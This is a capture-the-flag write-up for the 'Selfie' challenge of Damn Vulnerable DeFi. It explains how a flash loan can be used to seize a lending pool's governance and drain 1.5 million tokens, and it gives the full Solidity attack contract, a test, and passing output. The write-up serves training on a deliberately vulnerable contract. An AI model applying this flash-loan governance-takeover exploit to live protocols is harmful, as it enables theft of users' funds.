# Damn Vulnerable DeFi (Foundry version)

- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

## Challenge #6 - Selfie - Description

A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Scope

| File Name                                                                    | SHA-1 Hash                               |
| ---------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/selfie/SelfiePool.sol             | 7769017e86bf554c0134721a4dfd961a979b9140 |
| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/SimpleGovernance.sol | b1421c7304c5709e8bbedaea0dd5fafc00586711 |

## Plan

Flash loan **and** governance mechanism... I think we already have an idea about the exploitation.

## Solution

<details>
    <summary>Description</summary>

`SelfiePool` has two functions `flashLoan`, with a check that the [borrower must be a contract](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/selfie/SelfiePool.sol#L42) and we will have to implement our own [`receiveTokens`](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/selfie/SelfiePool.sol#L43), and `drainAllFunds`, that [`onlyGovernance`](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/selfie/SelfiePool.sol#L50) can call it. So, we are going to abuse the `flashLoan` to somehow gain control of the governance.

`SimpleGovernance` has `queueAction`, that adds a proposal to the queue **only** [if `msg.sender` owns more than half of the total DamnValuableTokenSnapshot on the last snapshot](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/selfie/SimpleGovernance.sol#L92-L96).

`SimpleGovernance` has also `executeAction` that executes an action form the queue **only** [if it's the first time that is been executed **and** two days have passed](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/selfie/SimpleGovernance.sol#L88).

1.  Call `flashLoan` with `TOKENS_IN_POOL` from our `Attack` contract.
2.  In our `receiveTokens` trigger `snapshot` of `DamnValuableTokenSnapshot`.
3.  Call `queueAction` of `SimpleGovernance`.
4.  Pay back the loan.
5.  Fast-forward 2 days.
6.  Call `executeAction` of `SimpleGovernance`.

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/selfie/Selfie.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.prank(attacker);
        Attack attack = new Attack(simpleGovernance, selfiePool, attacker);
        attack.pwn(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        simpleGovernance.executeAction(attack.drainActionId());
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Attack {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    address attacker;
    uint256 public drainActionId;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, address _attacker) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        attacker = _attacker;
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external payable {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
        drainActionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        DamnValuableTokenSnapshot(tokenAddress).transfer(address(selfiePool), borrowAmount);
    }

    function pwn(uint256 borrowAmount) external {
        selfiePool.flashLoan(borrowAmount);
    }
}
```

</details>

### Proof of Concept

```
./run.sh 6
[⠢] Compiling...
[⠢] Compiling 1 files with 0.8.17
[⠆] Solc 0.8.17 finished in 889.98ms
Compiler run successful

Running 1 test for test/Levels/selfie/Selfie.t.sol:Selfie
[PASS] testExploit() (gas: 827663)
Logs:
  🧨 Let's see if you can break it... 🧨

🎉 Congratulations, you can go to the next level! 🎉

Test result: ok. 1 passed; 0 failed; finished in 1.24ms
```
